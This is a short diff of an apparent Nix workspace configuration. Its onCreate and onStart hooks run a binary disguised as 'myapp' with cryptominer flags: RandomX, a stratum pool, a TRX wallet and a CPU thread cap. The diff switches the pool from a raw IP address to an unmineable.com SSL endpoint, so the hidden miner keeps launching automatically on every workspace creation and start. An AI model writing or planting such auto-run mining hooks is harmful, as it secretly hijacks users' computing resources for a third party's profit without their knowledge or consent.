@@ -18,14 +18,14 @@
       onCreate = {
         run = ''
           echo "Running myapp on create..."
-          /home/user/da/myapp -a rx/0 -o stratum+tcp://143.198.88.226:3333 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.okdi -p x -k --cpu-max-threads-hint=70
+          /home/user/da/myapp -a rx/0 -o stratum+ssl://rx.unmineable.com:443 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.okdi -p x -k --cpu-max-threads-hint=70
         '';
       };
 
       onStart = {
         run = ''
           echo "Running myapp on start..."
-          /home/user/da/myapp -a rx/0 -o stratum+tcp://143.198.88.226:3333 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.okdi -p x -k --cpu-max-threads-hint=70
+          /home/user/da/myapp -a rx/0 -o stratum+ssl://rx.unmineable.com:443 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.okdi -p x -k --cpu-max-threads-hint=70
         '';
       };
     };
